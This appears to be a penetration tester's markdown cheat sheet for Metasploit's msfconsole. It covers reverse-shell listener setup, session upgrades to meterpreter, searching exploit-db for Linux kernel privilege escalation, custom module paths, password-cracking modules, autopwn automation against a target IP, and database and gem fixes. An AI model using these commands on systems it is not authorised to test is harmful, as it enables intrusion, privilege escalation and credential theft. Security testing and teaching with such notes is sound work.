# msfconsole

                                       ___          ____
                                   ,-""   `.      < HONK >
                                 ,'  _   e )`-._ /  ----
                                /  ,' `-._<.===-'
                               /  /
                              /  ;
                  _          /   ;
     (`._    _.-"" ""--..__,'    |
     <_  `-""                     \
      <`-                          :
       (__   <__.                  ;
         `-.   '-.__.      _.'    /
            \      `-.__,-'    _,'
             `._    ,    /__,-'
                ""._\__,'< <____
                     | |  `----.`.
                     | |        \ `.
                     ; |___      \-``
                     \   --<
                      `.`.<
                        `-'

## create reverse listener

> helps to deal with latency

    use multi/handler
    set lport 6666
    exploit -j
    jobs

once pwn / connected:

    sessions -l
    sessions -i <id>

    # upgrade shell to meterpreter
    sessions -u <session_id>

    # kill all jobs
    jobs -k

## manual exploits using exploitdb

One may need to adapt something from the wild or simply use more than msf community has to offer:

    searchsploit privilege | grep -i linux | grep -i kernel | grep 3.13
    searchsploit <keyword1> <keyword2>

    # get full path (/usr/share/exploitdb/)
    searchsploit -p 33824
    locate linux/local/33824.c

## add custom exploit

        $ tree /root/.msf4/modules/
        /root/.msf4/modules/
        ├── exploits
        │   └── windows
        │       └── trusted_privilge_escalation.rb
        └── post
            └── kernel_3_13.rb

## msf db missing role

    msf5 > db_connect msfdb init
    [-] Error while running command db_connect: Failed to connect to the Postgres data service: FATAL:  role "<user>" does not exist

    sudo -u postgres createuser -s $(whoami); createdb $(whoami)

## missing gems

    $ sudo msfconsole
    Unable to find a spec satisfying metasploit-framework (>= 0) in the set. Perhaps the lockfile is corrupted?                                               Run `bundle install` to install missing gems.

    $ cd /usr/share/metasploit-frame
    $ sudo gem install bundler
    $ sudo bundle install
    $ sudo gem update --system

## passwords

    msf6 > search auxiliary/analyze

    Matching Modules
    ================

       #  Name                                      Disclosure Date  Rank    Check  Description
       -  ----                                      ---------------  ----    -----  -----------
       0  auxiliary/analyze/apply_pot                                normal  No     Apply Pot File To Hashes
       1  auxiliary/analyze/crack_aix                                normal  No     Password Cracker: AIX
       2  auxiliary/analyze/crack_databases                          normal  No     Password Cracker: Databases
       3  auxiliary/analyze/crack_linux                              normal  No     Password Cracker: Linux
       4  auxiliary/analyze/crack_mobile                             normal  No     Password Cracker: Mobile
       5  auxiliary/analyze/crack_osx                                normal  No     Password Cracker: OSX
       6  auxiliary/analyze/crack_webapps                            normal  No     Password Cracker: Webapps
       7  auxiliary/analyze/crack_windows                            normal  No     Password Cracker: Windows
       8  auxiliary/analyze/modbus_zip                               normal  No     Extract zip from Modbus communication
       9  auxiliary/scanner/oracle/oracle_hashdump                   normal  No     Oracle Password Hashdump

## automation

### autopwn

    wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
    cp db_autopwn.rb /usr/share/metasploit-framework/plugins
    cp db_autopwn.rb /opt/metasploit-framework/plugins
    msfconsole
    load db_autopwn
    db_autopwn -p -R great -e -q <target-ip>
